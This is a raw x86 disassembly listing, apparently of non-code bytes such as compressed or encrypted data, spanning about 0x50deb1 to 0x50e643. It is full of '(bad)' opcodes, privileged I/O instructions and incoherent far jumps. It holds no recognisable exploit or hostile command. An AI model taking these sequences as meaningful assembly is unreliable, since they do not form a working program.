  50deb1:	rol    BYTE PTR [edi+0x1f320cf7],1
  50deb7:	fcom   DWORD PTR [ebx-0x60]
  50deba:	xchg   BYTE PTR [esi+edx*2+0x8f42597],dh
  50dec1:	xor    DWORD PTR [edx+0x4],edi
  50dec4:	push   cs
  50dec5:	sub    DWORD PTR [eax],ebp
  50dec7:	gs mov bl,0x65
  50deca:	in     eax,dx
  50decb:	xchg   ebx,eax
  50decc:	and    eax,0x571fdb9b
  50ded1:	sub    al,0x61
  50ded3:	jmp    0x45c7:0x4112ad78
  50deda:	pop    ebp
  50dedb:	js     0x50de71
  50dedd:	and    BYTE PTR [eax+eiz*2-0x65b0246b],0x6e
  50dee5:	mov    esp,0x79b3ddcc
  50deea:	sahf   
  50deeb:	xor    BYTE PTR [ebx-0x41],0x7a
  50deef:	lods   al,BYTE PTR ds:[esi]
  50def0:	or     al,cl
  50def2:	mov    gs,WORD PTR [edx]
  50def4:	es std 
  50def6:	in     eax,dx
  50def7:	mov    bh,0x19
  50def9:	adc    DWORD PTR [ecx],esp
  50defb:	test   eax,0xeebcd059
  50df00:	add    al,0xce
  50df02:	sbb    al,0x5d
  50df04:	shl    DWORD PTR [ebx-0x70018a4],1
  50df0a:	dec    ebp
  50df0b:	dec    edi
  50df0c:	and    edx,DWORD PTR [esp+eax*8+0x57]
  50df10:	jg     0x50dec1
  50df12:	imul   edi,DWORD PTR [esp+edi*1+0x328d61f0],0x4e
  50df1a:	push   edi
  50df1b:	(bad)  
  50df1c:	int3   
  50df1d:	lods   eax,DWORD PTR ds:[esi]
  50df1e:	mov    BYTE PTR [eax],al
  50df20:	jns    0x50ded5
  50df22:	inc    edx
  50df23:	xchg   edx,eax
  50df24:	outs   dx,DWORD PTR ds:[esi]
  50df25:	test   al,0x7f
  50df27:	xlat   BYTE PTR ds:[ebx]
  50df28:	(bad)  
  50df29:	cs add DWORD PTR gs:[ebp+ecx*2-0x34],edx
  50df2f:	daa    
  50df30:	pushf  
  50df31:	aaa    
  50df32:	xor    cl,BYTE PTR [ebx]
  50df34:	bound  edi,QWORD PTR [ebx]
  50df36:	pusha  
  50df37:	adc    edx,edi
  50df39:	inc    ecx
  50df3a:	aam    0x39
  50df3c:	jl     0x50df78
  50df3e:	cdq    
  50df3f:	ret    
  50df40:	fcomip st,st(1)
  50df42:	or     al,0xfb
  50df44:	loop   0x50dfb0
  50df46:	call   0x1797:0x1c4971fe
  50df4d:	mov    edx,0x4f0ca44b
  50df52:	adc    al,BYTE PTR [ebp-0x3d]
  50df55:	sub    BYTE PTR [bp+di+0x4c3d],dh
  50df5a:	lods   eax,DWORD PTR ds:[esi]
  50df5b:	popf   
  50df5c:	adc    al,0x31
  50df5e:	sub    DWORD PTR [esi+0x4cf5adc0],ebx
  50df64:	test   BYTE PTR [edi-0x22],ah
  50df67:	les    ebp,FWORD PTR [eax]
  50df69:	xchg   edi,eax
  50df6a:	jmp    0xb4f2c98d
  50df6f:	pop    edx
  50df70:	inc    esp
  50df71:	shl    DWORD PTR [ebx+0x4],0xed
  50df75:	repnz mov ecx,0x8d548f7b
  50df7b:	inc    edx
  50df7c:	neg    eax
  50df7e:	xor    esi,DWORD PTR [edi-0x10]
  50df81:	sub    BYTE PTR ds:0x18e04f6e,al
  50df87:	imul   ebx,DWORD PTR [eax-0x48],0xffffffa3
  50df8b:	or     DWORD PTR [edi-0x3f],edi
  50df8e:	push   0xdb91cf81
  50df93:	(bad)  
  50df94:	dec    esi
  50df95:	jecxz  0x50df46
  50df97:	dec    edi
  50df98:	retf   
  50df99:	pop    es
  50df9a:	mov    ebx,0x85f97f82
  50df9f:	outs   dx,BYTE PTR ds:[esi]
  50dfa0:	fist   DWORD PTR [ebx+0x2d34f942]
  50dfa6:	jl     0x50df39
  50dfa8:	loop   0x50dfcd
  50dfaa:	gs pop edx
  50dfac:	dec    esp
  50dfad:	cmp    eax,0x9d20647d
  50dfb2:	cs test ebp,eax
  50dfb5:	xchg   esp,eax
  50dfb6:	push   ebx
  50dfb7:	fisttp QWORD PTR [edi+ecx*4+0x7644d92a]
  50dfbe:	push   ecx
  50dfbf:	mov    ebp,DWORD PTR [ebx+edx*2+0x6f6da520]
  50dfc6:	push   0xfffffff2
  50dfc8:	sbb    al,0x24
  50dfca:	mov    ecx,0x444c4949
  50dfcf:	pop    ss
  50dfd0:	jo     0x50e016
  50dfd2:	sub    DWORD PTR [edi],0xffffffb4
  50dfd5:	jp     0x50dfb1
  50dfd7:	les    esi,FWORD PTR [ecx]
  50dfd9:	nop
  50dfda:	out    0x67,eax
  50dfdc:	cmp    DWORD PTR [ebx+0x57],ecx
  50dfdf:	test   eax,0x15a58fe9
  50dfe4:	jl     0x50e056
  50dfe6:	push   es
  50dfe7:	sub    edi,esi
  50dfe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  50dfea:	mov    dh,0x39
  50dfec:	ja     0x50dfc5
  50dfee:	(bad)  
  50dfef:	push   ds
  50dff0:	or     edi,esp
  50dff2:	cmp    BYTE PTR [ebp-0x4],bl
  50dff5:	je     0x50e068
  50dff7:	or     edx,edx
  50dff9:	xchg   edx,eax
  50dffa:	adc    BYTE PTR [edx-0x76],cl
  50dffd:	sub    eax,0xd08ebeb1
  50e002:	pop    edx
  50e003:	loop   0x50e07e
  50e005:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50e006:	jle    0x50e032
  50e008:	push   ecx
  50e009:	jne    0x50dfc8
  50e00b:	mov    al,ds:0x66c58a4d
  50e010:	rcr    BYTE PTR [edi+ebp*1-0x34c8b7ef],0x55
  50e018:	call   0x812a077e
  50e01d:	sub    dh,BYTE PTR [eax+0x1d]
  50e020:	jmp    0x50e016
  50e022:	push   ss
  50e023:	dec    edi
  50e024:	xor    eax,0xbe821cb5
  50e029:	test   DWORD PTR [eax],esp
  50e02b:	and    DWORD PTR fs:[edi],edi
  50e02e:	sub    BYTE PTR [eax-0x3d239208],bh
  50e034:	es inc ebp
  50e036:	mov    dh,0xe3
  50e038:	push   0xffffffd2
  50e03a:	hlt    
  50e03b:	call   0x68e2:0xa34f6520
  50e042:	stos   BYTE PTR es:[edi],al
  50e043:	dec    ecx
  50e044:	xchg   esi,eax
  50e045:	into   
  50e046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50e047:	shl    BYTE PTR [edi-0x11afc5f2],1
  50e04d:	pop    esi
  50e04e:	ror    DWORD PTR [edx-0x121d460a],1
  50e054:	mov    DWORD PTR [ecx-0x45eb788f],eax
  50e05a:	jp     0x50e0c7
  50e05c:	or     ebp,DWORD PTR [ecx]
  50e05e:	sbb    dh,BYTE PTR [eax]
  50e060:	jmp    0x50dffc
  50e062:	nop
  50e063:	mov    esp,0xc73095a4
  50e068:	stc    
  50e069:	sub    bh,BYTE PTR [eax+ebp*4-0x269b3efd]
  50e070:	mov    dl,0xac
  50e072:	in     eax,dx
  50e073:	xchg   ebp,eax
  50e074:	cmp    eax,0x328191ee
  50e079:	repnz repnz fwait
  50e07c:	mov    edi,0xe77a27ba
  50e081:	dec    eax
  50e082:	add    BYTE PTR [ebx+eax*8-0x4bb50692],dh
  50e089:	add    BYTE PTR [edx+0x3f34d944],0x48
  50e090:	push   ebx
  50e091:	pop    esi
  50e092:	es pop edi
  50e094:	shl    esi,1
  50e096:	sti    
  50e097:	push   0xcc8a4335
  50e09c:	push   edi
  50e09d:	ins    BYTE PTR es:[edi],dx
  50e09e:	dec    ebx
  50e09f:	ret    
  50e0a0:	mov    ds:0x6a2a20b,al
  50e0a5:	mov    ?,WORD PTR [edx+0x47b1a524]
  50e0ab:	jb     0x50e057
  50e0ad:	inc    esi
  50e0ae:	aaa    
  50e0af:	jmp    0x337e:0xc74d5442
  50e0b6:	mov    eax,ds:0x8869b8fa
  50e0bb:	inc    esi
  50e0bc:	cmp    cl,BYTE PTR [edi+0x62]
  50e0bf:	add    al,0x91
  50e0c1:	rcl    BYTE PTR [edi+0x22],cl
  50e0c4:	sub    ah,al
  50e0c6:	in     al,0x83
  50e0c8:	add    dl,BYTE PTR [esi]
  50e0ca:	ror    BYTE PTR [edx],1
  50e0cc:	rol    BYTE PTR [eax+ebp*8+0x62],0x53
  50e0d1:	push   esp
  50e0d2:	cdq    
  50e0d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50e0d4:	xlat   BYTE PTR ds:[ebx]
  50e0d5:	je     0x50e0a1
  50e0d7:	xchg   ebx,eax
  50e0d8:	mov    eax,0x79aa070d
  50e0dd:	xor    DWORD PTR [edi-0x71f51d10],edi
  50e0e3:	mov    al,ds:0x5e89fde
  50e0e8:	mov    bl,0x8f
  50e0ea:	mov    ecx,0xa7c3412f
  50e0ef:	adc    DWORD PTR [edi+0x6],esi
  50e0f2:	ror    esp,cl
  50e0f4:	retf   0x585
  50e0f7:	popf   
  50e0f8:	jns    0x50e135
  50e0fa:	or     edx,ecx
  50e0fc:	hlt    
  50e0fd:	sub    DWORD PTR [edi-0x31],edx
  50e100:	clc    
  50e101:	rol    BYTE PTR [ecx+0x571b2685],cl
  50e107:	ds cmc 
  50e109:	pushf  
  50e10a:	sub    al,0x7a
  50e10c:	and    DWORD PTR [ebp+0x5d],ebx
  50e10f:	ret    
  50e110:	rol    DWORD PTR [ebx],cl
  50e112:	add    BYTE PTR [edi+0x3a950a1e],0x79
  50e119:	mov    al,BYTE PTR [ebp+0x5cda44df]
  50e11f:	std    
  50e120:	aam    0xab
  50e122:	popf   
  50e123:	loopne 0x50e160
  50e125:	push   cs
  50e126:	shr    BYTE PTR [edx-0x37],1
  50e129:	push   0x65a67791
  50e12e:	push   edx
  50e12f:	pop    eax
  50e130:	or     eax,0x2137aa0a
  50e135:	mov    dl,0xb3
  50e137:	pop    ebx
  50e138:	frstor [ecx-0x45a02b5]
  50e13e:	pop    eax
  50e13f:	inc    eax
  50e140:	mov    eax,0xcc255064
  50e145:	pop    ecx
  50e146:	das    
  50e147:	inc    eax
  50e148:	jae    0x50e1b6
  50e14a:	xor    bl,BYTE PTR [ecx+0x68]
  50e14d:	cwde   
  50e14e:	mov    edx,0x7eedd5e7
  50e153:	inc    ebx
  50e154:	lock xlat BYTE PTR ds:[ebx]
  50e156:	mov    es,WORD PTR [ebx+0x64]
  50e159:	pushf  
  50e15a:	sub    BYTE PTR [edi+ecx*8],dh
  50e15d:	jb     0x50e1d4
  50e15f:	mov    dh,0xe
  50e161:	aas    
  50e162:	test   BYTE PTR [ecx+0x3b01abff],bl
  50e168:	fwait
  50e169:	mov    esp,0x9a7b5cce
  50e16e:	mov    WORD PTR cs:[ebx-0x374c56cd],es
  50e175:	mov    bl,0x12
  50e177:	xchg   ebp,eax
  50e178:	inc    esi
  50e179:	cmp    bl,BYTE PTR [ebx+ebx*2]
  50e17c:	pop    ds
  50e17d:	pop    ebp
  50e17e:	es or  DWORD PTR gs:[ebp-0x4e],esp
  50e183:	dec    ebp
  50e184:	mov    bl,0x91
  50e186:	add    ah,BYTE PTR [esp+edi*2]
  50e189:	popf   
  50e18a:	xor    esp,esp
  50e18c:	repz sbb BYTE PTR [edx],0xec
  50e190:	leave  
  50e191:	(bad)  
  50e193:	xor    BYTE PTR [edx+0x7f05cbc8],0xd1
  50e19a:	popf   
  50e19b:	dec    eax
  50e19c:	xchg   edi,eax
  50e19d:	loop   0x50e14d
  50e19f:	dec    edx
  50e1a0:	clc    
  50e1a1:	mov    ss,ebp
  50e1a3:	push   ecx
  50e1a4:	dec    esp
  50e1a5:	and    al,0x82
  50e1a7:	mov    BYTE PTR [ebp-0x1f381d4],ah
  50e1ad:	fldenv [eax-0x72]
  50e1b0:	adc    ebp,DWORD PTR [edx-0x4842fba6]
  50e1b6:	pop    ecx
  50e1b7:	in     al,dx
  50e1b8:	jnp    0x50e1f4
  50e1ba:	dec    edx
  50e1bb:	jae    0x50e182
  50e1bd:	mov    al,ds:0x3dc04c7b
  50e1c2:	rcl    BYTE PTR [ecx],cl
  50e1c4:	push   ebx
  50e1c5:	inc    ecx
  50e1c6:	bound  esi,QWORD PTR [edi+0x7a5db32e]
  50e1cc:	or     al,0xff
  50e1ce:	pop    ebx
  50e1cf:	jmp    0x50e1c5
  50e1d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50e1d2:	mov    dh,0xa5
  50e1d4:	rcl    edx,0x49
  50e1d7:	dec    edx
  50e1d8:	nop
  50e1d9:	adc    cl,BYTE PTR [esi]
  50e1db:	fist   WORD PTR [ebx]
  50e1dd:	std    
  50e1de:	in     al,0x5f
  50e1e0:	push   0x545dbacf
  50e1e5:	pushf  
  50e1e6:	xchg   esi,eax
  50e1e7:	jb     0x50e1a8
  50e1e9:	fmul   QWORD PTR [esi+0x69]
  50e1ec:	fimul  DWORD PTR [edx-0x5d]
  50e1ef:	mov    al,ds:0xf42d3cb8
  50e1f4:	jmp    0x50e1dd
  50e1f6:	xor    al,0x8c
  50e1f8:	std    
  50e1f9:	cli    
  50e1fa:	ins    BYTE PTR es:[edi],dx
  50e1fb:	sub    bh,dh
  50e1fd:	fdivr  QWORD PTR [ecx]
  50e1ff:	ins    DWORD PTR es:[edi],dx
  50e200:	mov    DWORD PTR ds:0x534aa246,esi
  50e206:	test   bh,bl
  50e208:	fwait
  50e209:	xchg   esp,eax
  50e20a:	xchg   DWORD PTR [edx-0x30],esi
  50e20d:	or     dh,ch
  50e20f:	adc    eax,0xf01e6b3e
  50e214:	dec    eax
  50e215:	push   ecx
  50e216:	sub    ecx,ebx
  50e218:	or     cl,BYTE PTR [ecx-0x65b5fb6d]
  50e21e:	or     al,0x56
  50e220:	or     BYTE PTR [edi+0x3b],al
  50e223:	adc    ecx,0x54bbb44c
  50e229:	or     DWORD PTR [edx],ecx
  50e22b:	xchg   DWORD PTR [eax+eax*2],ebx
  50e22e:	scas   eax,DWORD PTR es:[edi]
  50e22f:	lods   eax,DWORD PTR ds:[esi]
  50e230:	bound  edx,QWORD PTR [edx-0x423d139e]
  50e236:	retf   0x66aa
  50e239:	call   0x721b185e
  50e23e:	inc    ebp
  50e23f:	retf   0x6b05
  50e242:	shl    esp,cl
  50e244:	test   eax,0x40479073
  50e249:	rol    BYTE PTR [edx-0xf95fc81],1
  50e24f:	ret    0x3ffc
  50e252:	mov    bl,0x40
  50e254:	sbb    al,0x87
  50e256:	mov    dh,0x46
  50e258:	js     0x50e2bd
  50e25a:	js     0x50e28b
  50e25c:	lds    edx,FWORD PTR fs:[ebx+0x6]
  50e260:	jnp    0x50e1e8
  50e262:	rcl    BYTE PTR gs:[ebx+0x5abec4fb],0xba
  50e26a:	clc    
  50e26b:	das    
  50e26c:	lock addr16 std 
  50e26f:	cmc    
  50e270:	popf   
  50e271:	fidiv  WORD PTR [eax-0x7c]
  50e274:	mov    BYTE PTR [eax],0xcd
  50e277:	in     eax,0x59
  50e279:	pop    ss
  50e27a:	aam    0xec
  50e27c:	ins    DWORD PTR es:[edi],dx
  50e27d:	sub    eax,0x5e4a33cd
  50e282:	inc    esp
  50e283:	out    dx,al
  50e284:	pop    ebp
  50e285:	jbe    0x50e2db
  50e287:	jbe    0x50e2f0
  50e289:	loop   0x50e2d8
  50e28b:	ins    BYTE PTR es:[edi],dx
  50e28c:	test   eax,0x81eb0072
  50e291:	xchg   edi,eax
  50e292:	jle    0x50e28e
  50e294:	ror    BYTE PTR [esi+0x63],0x87
  50e298:	into   
  50e299:	rol    edx,cl
  50e29b:	sub    eax,DWORD PTR [esi+0x30884d90]
  50e2a1:	clc    
  50e2a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50e2a3:	hlt    
  50e2a4:	stc    
  50e2a5:	and    ah,BYTE PTR [esi-0x18]
  50e2a8:	repnz pop edi
  50e2aa:	loope  0x50e265
  50e2ac:	ins    DWORD PTR es:[edi],dx
  50e2ad:	rol    DWORD PTR ds:[ecx+0x1bce8400],cl
  50e2b4:	mov    eax,0x71ddae93
  50e2b9:	dec    edi
  50e2ba:	sub    DWORD PTR [ebx+0x36],edi
  50e2bd:	imul   ecx,DWORD PTR [edi+ebp*8-0x5e],0xfcab1aa2
  50e2c5:	jmp    0x1c33032e
  50e2ca:	pop    edx
  50e2cb:	or     cl,BYTE PTR [esi+0x4f]
  50e2ce:	dec    edi
  50e2cf:	test   BYTE PTR [edi-0x4d1e4cc],ah
  50e2d5:	test   al,0xdc
  50e2d7:	mov    WORD PTR [eax+0x4150c42c],?
  50e2dd:	xchg   edi,eax
  50e2de:	lea    edi,[edi-0x6f]
  50e2e1:	enter  0x3781,0xe
  50e2e5:	cdq    
  50e2e6:	stc    
  50e2e7:	daa    
  50e2e8:	sbb    BYTE PTR [edx],al
  50e2ea:	fstp   DWORD PTR [esi+0x522f385f]
  50e2f0:	mov    al,0xa
  50e2f2:	(bad)  
  50e2f3:	fmul   DWORD PTR [esi-0x35]
  50e2f6:	and    DWORD PTR fs:[eax],ebx
  50e2f9:	aas    
  50e2fa:	pop    ebx
  50e2fb:	test   al,0x75
  50e2fd:	out    dx,eax
  50e2fe:	(bad)  
  50e2ff:	fistp  QWORD PTR [edi]
  50e301:	cld    
  50e302:	push   ecx
  50e303:	and    dl,BYTE PTR [edx-0x32]
  50e306:	test   BYTE PTR [edi+0x79db63a3],al
  50e30c:	cmp    BYTE PTR [edx+ebx*1+0x7b],al
  50e310:	in     eax,0xf7
  50e312:	int3   
  50e313:	adc    BYTE PTR [eax-0x56],dl
  50e316:	out    0x9a,eax
  50e318:	lock mov ds:0x5d87a2fc,al
  50e31e:	cmp    ah,BYTE PTR [edi-0x2eb12829]
  50e324:	ret    
  50e325:	in     eax,0x67
  50e327:	sub    eax,DWORD PTR [edx+0x313987b2]
  50e32d:	push   esi
  50e32e:	daa    
  50e32f:	in     eax,0xd4
  50e331:	into   
  50e332:	inc    esi
  50e333:	jmp    0xe102d2bc
  50e338:	enter  0x810a,0xf8
  50e33c:	xchg   DWORD PTR [ebx-0x45],eax
  50e33f:	rcl    DWORD PTR [edx+edx*2+0x20cce659],0xfd
  50e347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50e348:	ds xchg ebp,eax
  50e34a:	pop    es
  50e34b:	ds xor ah,ch
  50e34e:	mov    ds:0xcb312aa3,al
  50e353:	in     al,0x92
  50e355:	add    BYTE PTR es:0xf80e4184,ch
  50e35c:	pop    ebp
  50e35d:	adc    DWORD PTR [edi],edx
  50e35f:	add    eax,0x68b50e84
  50e364:	je     0x50e31d
  50e366:	stos   BYTE PTR es:[edi],al
  50e367:	xchg   esp,eax
  50e368:	es repnz dec ecx
  50e36b:	fwait
  50e36c:	daa    
  50e36d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50e36e:	pop    edx
  50e36f:	jo     0x50e351
  50e371:	out    dx,al
  50e372:	ret    
  50e373:	sahf   
  50e374:	fcmovnb st,st(7)
  50e376:	xlat   BYTE PTR ds:[ebx]
  50e377:	mov    DWORD PTR [eax],ecx
  50e379:	pop    esi
  50e37a:	pop    edx
  50e37b:	cwde   
  50e37c:	pop    eax
  50e37d:	mov    bh,0x41
  50e37f:	dec    ebp
  50e380:	push   esp
  50e381:	aas    
  50e382:	sahf   
  50e383:	add    DWORD PTR [ecx+0x26],edi
  50e386:	mov    edi,0xb266726a
  50e38b:	out    dx,eax
  50e38c:	mul    al
  50e38e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50e38f:	sbb    BYTE PTR [ebx],dl
  50e391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50e392:	adc    al,0xcd
  50e394:	lods   eax,DWORD PTR ds:[esi]
  50e395:	shufps xmm3,xmm7,0xff
  50e399:	das    
  50e39a:	xor    DWORD PTR [edx+esi*8-0x7fc79ee5],eax
  50e3a1:	lds    edx,FWORD PTR [ebp+ecx*2+0x21]
  50e3a5:	dec    eax
  50e3a6:	pop    ecx
  50e3a7:	xchg   ebp,eax
  50e3a8:	gs pop edi
  50e3aa:	loopne 0x50e41b
  50e3ac:	ss cmp eax,0x4bc96e5c
  50e3b2:	test   DWORD PTR ds:0xbf1accf3,eax
  50e3b8:	sbb    eax,0x4047fd94
  50e3bd:	mov    ch,BYTE PTR [esi+0x10]
  50e3c0:	xor    esp,DWORD PTR [eax-0x47]
  50e3c3:	pop    esp
  50e3c4:	push   edx
  50e3c5:	sub    eax,0xb15a4f45
  50e3ca:	ficomp WORD PTR [eax-0x67]
  50e3cd:	stos   BYTE PTR es:[edi],al
  50e3ce:	aaa    
  50e3cf:	loopne 0x50e3e7
  50e3d1:	mov    eax,ds:0x19c32205
  50e3d6:	jg     0x50e429
  50e3d8:	xor    al,0x82
  50e3da:	xor    eax,0x9576a251
  50e3df:	retf   
  50e3e0:	push   ss
  50e3e1:	shl    ecx,0x96
  50e3e4:	aaa    
  50e3e5:	xor    eax,0xc4252a33
  50e3ea:	sub    dh,BYTE PTR [edx-0x70dfff3a]
  50e3f0:	jns    0x50e38e
  50e3f2:	nop
  50e3f3:	mov    ebx,0x8533c3ab
  50e3f8:	mov    esi,0x5301ee9d
  50e3fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50e3fe:	les    esi,FWORD PTR [eax+0x9]
  50e401:	mov    esi,0x8c384215
  50e406:	adc    ebp,DWORD PTR [edx]
  50e408:	dec    esi
  50e409:	mov    bl,0xde
  50e40b:	mov    esi,0x72719efd
  50e410:	mov    esp,0x345c03a2
  50e415:	dec    edi
  50e416:	call   FWORD PTR [edi-0x33633f56]
  50e41c:	std    
  50e41d:	push   es
  50e41e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50e41f:	adc    esp,DWORD PTR [esi-0x43]
  50e422:	or     eax,0x5104a48f
  50e427:	inc    edi
  50e428:	out    0xd9,eax
  50e42a:	mov    esi,0x46bfb871
  50e42f:	dec    ecx
  50e430:	stos   DWORD PTR es:[edi],eax
  50e431:	push   0x497f0082
  50e436:	mov    ds:0x8603c6ba,al
  50e43b:	icebp  
  50e43c:	iret   
  50e43d:	add    DWORD PTR [edx],0xffffffa4
  50e440:	mov    ds:0x9094ffd4,al
  50e445:	xchg   ebp,eax
  50e446:	(bad)  
  50e447:	xchg   esi,eax
  50e448:	inc    ecx
  50e449:	test   BYTE PTR ds:0x28f4c3bf,ch
  50e44f:	sub    BYTE PTR cs:[ebx-0x761e3861],ah
  50e456:	lock imul ebx,DWORD PTR [eax+ebp*4],0x38fcd826
  50e45e:	rcr    BYTE PTR [esi],0x20
  50e461:	pop    DWORD PTR [ecx+0x31]
  50e464:	push   cs
  50e465:	in     eax,dx
  50e466:	push   ds
  50e467:	push   ss
  50e468:	add    dh,BYTE PTR fs:0x40ca0f7c
  50e46f:	outs   dx,DWORD PTR ds:[esi]
  50e470:	mov    eax,ds:0x2798acc3
  50e475:	lock addps xmm4,XMMWORD PTR [ecx-0xb]
  50e47a:	loope  0x50e407
  50e47c:	sub    al,0xb2
  50e47e:	and    eax,0x8d558c6c
  50e483:	fsubr  st,st(0)
  50e485:	inc    ebx
  50e486:	imul   edi,DWORD PTR [ebx+0x57],0xfffffff7
  50e48a:	adc    BYTE PTR [esp+esi*8-0x1a08973d],al
  50e491:	fs ins BYTE PTR es:[edi],dx
  50e493:	sahf   
  50e494:	mov    dl,0x76
  50e496:	cmp    DWORD PTR [edi],ecx
  50e498:	mov    esp,0x584050b2
  50e49d:	aas    
  50e49e:	stos   DWORD PTR es:[edi],eax
  50e49f:	aas    
  50e4a0:	jb     0x50e4ea
  50e4a2:	retf   
  50e4a3:	pushf  
  50e4a4:	ds pop esi
  50e4a6:	add    BYTE PTR [eax-0xe],bl
  50e4a9:	sbb    BYTE PTR [ebx+0x42],cl
  50e4ac:	mov    ebp,0x9d7815d0
  50e4b1:	pushf  
  50e4b2:	adc    eax,0xe7450770
  50e4b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50e4b8:	lea    edx,[edx+eiz*8+0x74]
  50e4bc:	inc    edx
  50e4bd:	push   esp
  50e4be:	or     DWORD PTR ds:0xa20a5802,0x49
  50e4c5:	dec    ebp
  50e4c6:	mov    ch,0xed
  50e4c8:	xor    eax,DWORD PTR [esp+eax*8-0x77227acb]
  50e4cf:	ret    
  50e4d0:	cmc    
  50e4d1:	fisttp QWORD PTR [edi-0x2cf85060]
  50e4d7:	ja     0x50e4ee
  50e4d9:	fs loop 0x50e4d9
  50e4dc:	dec    edi
  50e4dd:	frstor [eax+esi*4]
  50e4e0:	push   0x4b
  50e4e2:	out    dx,al
  50e4e3:	mov    edx,0xbe2cbb2f
  50e4e8:	or     eax,0x22e86cdd
  50e4ee:	inc    ebx
  50e4ef:	aaa    
  50e4f0:	mov    bh,0x14
  50e4f2:	stc    
  50e4f3:	sub    ecx,DWORD PTR [ecx-0x66]
  50e4f6:	cmp    BYTE PTR [esp+esi*4-0x6f],cl
  50e4fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50e4fb:	push   eax
  50e4fc:	pop    edi
  50e4fd:	addr16 sub al,0x6a
  50e500:	mov    ds:0xcc859e48,eax
  50e505:	sub    al,0x34
  50e507:	dec    ebp
  50e508:	or     BYTE PTR [esi-0x63],0x96
  50e50c:	fs (bad) 
  50e50e:	sub    BYTE PTR [ebx-0x7785c8c3],bl
  50e514:	pop    es
  50e515:	and    al,0xf9
  50e517:	or     BYTE PTR [ebx+0x64f27cc4],0x1c
  50e51e:	and    eax,0x8f18ae41
  50e523:	sahf   
  50e524:	pop    ebx
  50e525:	test   DWORD PTR ds:0x37e5eb7f,eax
  50e52b:	sub    dl,BYTE PTR [edx]
  50e52d:	xchg   ecx,eax
  50e52e:	mov    esp,DWORD PTR [ecx-0x96df575]
  50e534:	and    dh,0x92
  50e537:	bound  ecx,QWORD PTR [ebx]
  50e539:	call   edi
  50e53b:	(bad)  
  50e53c:	jmp    0xb268e815
  50e541:	test   al,ah
  50e543:	gs aam 0x8f
  50e546:	pop    ebx
  50e547:	das    
  50e548:	mov    bh,0x8d
  50e54a:	pop    ebp
  50e54b:	add    al,0x6c
  50e54d:	or     DWORD PTR [edx-0x72],ebx
  50e550:	push   edx
  50e551:	ret    
  50e552:	push   DWORD PTR [ebx]
  50e554:	mov    edi,0x6cea3e2c
  50e559:	xchg   ecx,eax
  50e55a:	and    bh,BYTE PTR [ebp+0x36]
  50e55d:	retf   0x2008
  50e560:	push   ecx
  50e561:	sti    
  50e562:	sbb    DWORD PTR [edi-0x1d40990f],edx
  50e568:	or     DWORD PTR ds:0xa1c23c51,esi
  50e56e:	ret    
  50e56f:	sub    al,0xed
  50e571:	sub    eax,0x933e8239
  50e576:	push   ds
  50e577:	mov    ebp,0xac1aefe8
  50e57c:	addr16 popf 
  50e57e:	push   es
  50e57f:	dec    ecx
  50e580:	test   eax,0x903380a2
  50e585:	(bad)  
  50e586:	jnp    0x50e5e4
  50e588:	jae    0x50e574
  50e58a:	ror    dh,0x98
  50e58d:	loop   0x50e529
  50e58f:	je     0x50e5af
  50e591:	pop    ss
  50e592:	(bad)  
  50e593:	enter  0xb500,0x15
  50e597:	jnp    0x50e54d
  50e599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50e59a:	outs   dx,BYTE PTR ds:[esi]
  50e59b:	rol    bl,cl
  50e59d:	std    
  50e59e:	nop
  50e59f:	xor    ch,ch
  50e5a1:	pop    ds
  50e5a2:	in     eax,0x22
  50e5a4:	addr16 hlt 
  50e5a6:	stc    
  50e5a7:	jns    0x50e5d2
  50e5a9:	push   es
  50e5aa:	mov    esp,0x8ebdd938
  50e5af:	das    
  50e5b0:	shl    BYTE PTR [eax-0x37],0xf4
  50e5b4:	enter  0x678b,0x6a
  50e5b8:	loop   0x50e621
  50e5ba:	xor    dh,BYTE PTR fs:[eax+0x5c42d803]
  50e5c1:	ins    BYTE PTR es:[edi],dx
  50e5c2:	adc    ah,bh
  50e5c4:	into   
  50e5c5:	out    0x34,al
  50e5c7:	rcl    DWORD PTR [edi-0x5754b52b],1
  50e5cd:	fist   WORD PTR [ecx+0x5e9dffc0]
  50e5d3:	jbe    0x50e5d1
  50e5d5:	fisubr DWORD PTR [esi+0x7d]
  50e5d8:	mov    DWORD PTR ds:0xfb01165,edi
  50e5de:	cs mov dh,0xec
  50e5e1:	mov    ds:0x779526e4,al
  50e5e6:	in     eax,0xdd
  50e5e8:	cmp    eax,0x9eb410b9
  50e5ed:	jo     0x50e5da
  50e5ef:	aad    0xae
  50e5f1:	in     al,dx
  50e5f2:	std    
  50e5f3:	add    al,0x7c
  50e5f5:	ror    DWORD PTR [ebx+0x53],0x50
  50e5f9:	nop
  50e5fa:	add    cl,BYTE PTR [eax+eax*4]
  50e5fd:	inc    ebx
  50e5fe:	ficomp WORD PTR [ebp+esi*1+0x48]
  50e602:	add    BYTE PTR [ebp-0x37],dh
  50e605:	add    cl,bl
  50e607:	xchg   edx,eax
  50e608:	xor    DWORD PTR [esi+0x547ac8a],ebx
  50e60e:	cmp    ebp,DWORD PTR [edi+esi*4+0x73d4241c]
  50e615:	shl    ch,1
  50e617:	sbb    DWORD PTR [edi],edi
  50e619:	into   
  50e61a:	push   DWORD PTR [ecx+0x2fded3fc]
  50e620:	inc    edx
  50e621:	mov    al,ds:0x15f929f2
  50e626:	je     0x50e5c2
  50e628:	and    BYTE PTR [edx-0x56892c98],bl
  50e62e:	mov    dl,0xa9
  50e630:	sahf   
  50e631:	xor    al,0x7b
  50e633:	fisubr DWORD PTR [ebx+0x1007333f]
  50e639:	add    DWORD PTR [ebx],esp
  50e63b:	les    eax,FWORD PTR [edi]
  50e63d:	mov    ds:0x3d3bbe7a,eax
  50e642:	inc    edi
  50e643:	mov    esi,0xa2a8f167
